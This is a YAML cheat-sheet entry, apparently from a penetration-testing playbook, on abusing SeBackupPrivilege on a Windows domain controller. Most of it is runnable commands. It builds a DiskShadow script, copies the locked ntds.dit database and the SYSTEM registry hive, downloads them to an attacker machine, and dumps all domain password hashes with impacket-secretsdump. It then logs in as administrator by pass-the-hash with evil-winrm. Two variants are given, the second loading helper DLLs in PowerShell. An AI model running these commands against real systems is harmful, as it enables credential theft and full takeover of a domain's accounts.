---
description: |
  This guide demonstrates how to enumerate and exploit SeBackupPrivilege on a Windows Domain Controller to extract password hashes. It covers privilege enumeration, using DiskShadow to bypass file locks, copying ntds.dit and SYSTEM hive, and extracting hashes with Impacket. Two methods are shown: using built-in commands and PowerShell modules.

command: |
  whoami /priv | findstr /i "SeBackupPrivilege"

code: |
  # Method 1: DiskShadow and Robocopy

  # On Kali, create DiskShadow script
  nano admin.dsh
  set context persistent nowriters
  add volume c: alias admin
  create
  expose %admin% z:
  unix2dos admin.dsh

  # On Windows target, transfer and execute
  cd C:\Temp
  upload admin.dsh
  diskshadow /s admin.dsh
  robocopy /b z:\windows\ntds . ntds.dit
  reg save hklm\system c:\Temp\system

  # Download files to Kali
  cd C:\Temp
  download ntds.dit
  download system

  # Extract hashes with Impacket
  impacket-secretsdump -ntds ntds.dit -system system local

  # Pass-the-hash login
  evil-winrm -i <DC_IP> -u administrator -H "<NTLM_HASH>"

  # Method 2: PowerShell DLLs

  # Upload required files
  cd C:\Temp
  upload admin.dsh
  upload SeBackupPrivilegeUtils.dll
  upload SeBackupPrivilegeCmdLets.dll

  # Import DLLs and create backup
  Import-Module .\SeBackupPrivilegeUtils.dll
  Import-Module .\SeBackupPrivilegeCmdLets.dll
  diskshadow /s admin.dsh

  # Copy files using PowerShell cmdlet
  Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
  reg save hklm\system C:\Temp\system

  # Download files to Kali
  cd C:\Temp
  download ntds.dit
  download system

  # Extract hashes with Impacket
  impacket-secretsdump -ntds ntds.dit -system system local

  # Pass-the-hash login
  evil-winrm -i <DC_IP> -u administrator -H "<NTLM_HASH>"

OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://github.com/k4sth4/SeBackupPrivilege
  - https://github.com/giuliano108/SeBackupPrivilege 